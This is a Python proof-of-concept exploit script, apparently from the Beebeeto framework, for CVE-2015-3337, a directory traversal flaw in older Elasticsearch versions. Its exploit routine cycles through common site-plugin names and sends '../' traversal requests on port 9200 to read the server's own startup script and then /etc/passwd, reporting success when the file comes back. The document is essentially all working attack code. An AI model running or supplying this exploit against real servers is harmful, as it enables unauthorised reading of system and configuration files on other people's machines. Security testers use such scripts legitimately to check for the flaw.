#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests
import urlparse

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0103',
            'name': 'Elasticsearch < 1.4.5 / < 1.5.2 任意文件读取漏洞 Exploit',
            'author': '1024',
            'create_date': '2015-05-21',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [9200],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Elasticsearch',
            'vul_version': ['1.5.2'],
            'type': 'Arbitrary File Read',
            'tag': ['Elasticsearch漏洞', 'ES 任意文件读取漏洞', 'CVE-2015-3337'],
            'desc': '''
                    Directory traversal vulnerability in Elasticsearch before 1.4.5 and 1.5.x before 1.5.2,
                    when a site plugin is enabled, allows remote attackers to read arbitrary files via unspecified vectors.
                    ''',
            'references': [
                    'https://www.exploit-db.com/exploits/37054/',
                    'https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-3337',
            ],
        },
    }

    @classmethod
    def exploit(cls, args):
        # Include more plugin names to check if they are installed
        pluginList = ['test','kopf', 'HQ', 'marvel', 'bigdesk', 'head']
        target = urlparse.urlparse(args['options']['target'])
        for plugin in pluginList:
            es_test = '%s://%s:9200/_plugin/%s/../../../bin/elasticsearch' % \
                      (target.scheme, target.netloc, plugin)
            verify_url = '%s://%s:9200/_plugin/%s/../../../../../../etc/passwd' % \
                         (target.scheme, target.netloc, plugin)
            response = requests.get(es_test, timeout=8, allow_redirects=False)
            if "ES_JAVA_OPTS" in response.content:
                if args['options']['verbose']:
                    print '[*] Request URL: ' + es_test
                req = requests.get(verify_url, timeout=8)
                if req.status_code == 200:
                    args['success'] = True
                    args['poc_ret']['vul_url'] = verify_url
                    return args
            continue
        return args

    verify = exploit

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())